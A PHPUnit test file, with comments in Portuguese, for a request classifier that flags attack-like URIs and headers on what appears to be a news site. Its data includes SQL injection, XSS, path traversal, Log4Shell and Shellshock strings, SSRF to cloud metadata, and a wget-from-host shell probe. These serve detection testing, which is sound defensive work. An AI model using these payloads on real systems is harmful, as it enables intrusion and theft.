<?php

namespace Tests\Unit;

use App\Support\AttackSignatures;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/** Admin → Acessos: a cara de ataque do acesso, pelo catálogo do red-team, sem pegar a busca de notícias. */
class AttackSignaturesTest extends TestCase
{
    /** @return array<string, array{string, string}> */
    public static function attacks(): array
    {
        $cases = [
            'cms' => ['/wp-login.php', '/blog/wp-includes/wlwmanifest.xml', '/xmlrpc.php', '/?author=1', '/administrator/', '/wp-json/wp/v2/users'],
            'arquivo_sensivel' => ['/.env', '/.git/config', '/backup.zip', '/db.sql', '/config.php~', '/composer.json'],
            'painel' => ['/phpmyadmin/', '/server-status', '/manager/html', '/_cat/indices', '/+CSCOE+/logon.html', '/adminer.php'],
            'php_laravel' => ['/_ignition/health-check', '/telescope/requests', '/storage/logs/laravel.log', '/?XDEBUG_SESSION_START=phpstorm',
                '/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array', '/?page=php://filter/convert.base64-encode/resource=index',
                '/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input', '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1'],
            'java' => ['/actuator/env', '/jolokia/list', '/v2/api-docs', '/struts2-showcase/index.action', '/?class.module.classLoader.URLs[0]=0'],
            'cgi_iot' => ['/cgi-bin/test.cgi', '/HNAP1/', '/boaform/admin/formLogin', '/GponForm/diag_Form?images/', '/shell?cd+/tmp;wget+http://203.0.113.5/x'],
            'traversal' => ['/../../../../etc/passwd', '/?file=../../../../etc/passwd', '/%252e%252e/%252e%252e/etc/passwd',
                '/?template=..\..\windows\win.ini', '/?path=/proc/self/environ', '/index.php%00.txt'],
            'sqli' => ["/?id=1' AND 1=1-- -", '/?id=1+UNION+ALL+SELECT+NULL,NULL--', '/?page=1 OR 1=1', "/?q=1'+AND+SLEEP(5)--", '/?id=1;SELECT+pg_sleep(5)--'],
            'xss_ssti' => ['/?lang=<img src=x onerror=prompt(1)>', '/?x="><svg/onload=alert(1)>', '/?name={{7*7}}', '/?q=<script>alert(1)</script>', '/idioma/"><script>'],
            'ssrf_redirect' => ['/?url=http://169.254.169.254/latest/meta-data/', '/?next=//evil.com', '/?redirect=https:%2f%2fevil.com', '/?dest=gopher://127.0.0.1:6379/_'],
            'injecao_cabecalho' => ['/x%0d%0aSet-Cookie:a=1', '/%250d%250aLocation:x'],
            'api_recon' => ['/api', '/api/v1/users', '/graphql', '/api/swagger.json', '/?limit=99999'],
        ];

        $rows = [];

        foreach ($cases as $category => $uris) {
            foreach ($uris as $uri) {
                $rows["{$category}: {$uri}"] = [$uri, $category];
            }
        }

        return $rows;
    }

    #[DataProvider('attacks')]
    public function test_the_known_attack_gets_its_category(string $uri, string $category): void
    {
        $this->assertSame($category, AttackSignatures::classify($uri));
        $this->assertArrayHasKey($category, AttackSignatures::CATEGORIES);
    }

    public function test_the_browser_the_referer_and_the_header_names_count_first(): void
    {
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/', '${jndi:ldap://x.oast.fun/a}'));
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/sobre', '() { :; }; echo; /bin/cat /etc/passwd'));
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/', 'Mozilla/5.0', '<script>alert(1)</script>'));
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/', "' or 1=1 --"));
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/', null, null, ['Host', 'X-Original-URL']));
        $this->assertSame('injecao_cabecalho', AttackSignatures::classify('/', null, null, ['x-rewrite-url']));
    }

    public function test_the_site_and_the_news_search_are_not_attacks(): void
    {
        foreach ([
            '/', '/sobre?utm_source=x&utm_campaign=lancamento', '/materia/0b8e2c5e-4f3a-4d1b-9a7c-2f6e8d9c1a3b', '/api/news?page=2',
            '/api/news?per_page=100000', '/admin', '/admin/login', '/?page=1200', '/conta/confirmar-email/{user}/{hash}',
            '/a/{match}/nao-relevante', '/login/github/callback?code=&state=', '/.well-known/security.txt', '/idioma/en',
            '/?q=sql+injection', '/?q=union+select', '/?q=log4shell+${jndi}', '/?q=wp-login+brute+force', '/?q=/etc/passwd',
            '/?q=c%23&page=2', '/?q=phpmyadmin+cve', '/?q=xss+wordpress',
        ] as $uri) {
            $this->assertNull(AttackSignatures::classify($uri, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'https://www.google.com/'), $uri);
        }
    }

    public function test_a_huge_input_ends_fast(): void
    {
        $start = microtime(true);

        foreach (['/?x='.str_repeat('union ', 2000), '/'.str_repeat('a/', 5000), '/?q='.str_repeat("'", 10_000), str_repeat('${', 5000)] as $uri) {
            AttackSignatures::classify($uri, str_repeat('(', 10_000), str_repeat('{', 10_000));
        }

        $this->assertLessThan(0.5, microtime(true) - $start);
    }

    public function test_the_label_is_in_portuguese(): void
    {
        $this->assertSame('injeção de SQL', AttackSignatures::label('sqli'));
        $this->assertNull(AttackSignatures::label(null));
    }
}
